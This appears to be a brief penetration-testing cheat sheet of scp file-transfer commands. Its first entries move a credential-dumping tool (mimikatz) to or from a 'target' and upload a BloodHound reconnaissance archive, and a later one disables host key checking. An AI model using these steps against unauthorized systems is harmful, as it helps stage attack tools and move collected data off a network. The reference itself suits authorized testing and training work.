# Secure Copy Protocol (SCP)

### 1) Download file (Requires SSH credentials)

    scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe	

### 2) Upload file

    scp C:\Temp\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip	

### 3) Use private key

    scp -i ~/.ssh/id_rsa /home/user/config.txt user@192.168.1.10:/etc/config.txt

### 4) Choose specific port 

    scp -P 2222 /home/user/config.txt user@192.168.1.10:/etc/config.txt

### 5) Upload a directory recursively

    scp -r /home/user/html user@192.168.1.10:/var/www/

### 6) Upload multiple files

    scp /home/user/config.txt /home/user/passwd user@192.168.1.10:/etc/

### 7) Upload file without Host Key checking

    scp -o StrictHostKeyChecking=no /home/user/config.txt user@192.168.1.10:/etc/config.txt

### 8) Use legacy SCP protocol for file transfer instead

    scp -O file.txt user@IP:/home/user/file
